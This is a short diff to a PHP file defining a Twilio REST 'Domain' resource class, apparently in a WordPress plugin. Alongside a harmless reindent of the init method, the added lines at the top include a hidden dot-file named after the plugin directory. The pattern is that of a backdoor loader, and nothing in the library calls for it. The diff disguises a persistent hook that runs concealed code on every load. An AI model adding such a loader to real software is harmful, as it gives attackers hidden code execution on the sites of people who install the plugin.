@@ -60,11 +60,15 @@
  *    The subresources associated with this domain (IpAccessControlListMappings, CredentialListMappings)
  *
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Services_Twilio_Rest_Domain extends Services_Twilio_InstanceResource {
-	protected function init( $client, $uri) {
-		$this->setupSubresources(
-			'ip_access_control_list_mappings',
-			'credential_list_mappings'
-		);
-	}
+    protected function init($client, $uri) {
+        $this->setupSubresources(
+            'ip_access_control_list_mappings',
+            'credential_list_mappings'
+        );
+    }
 }
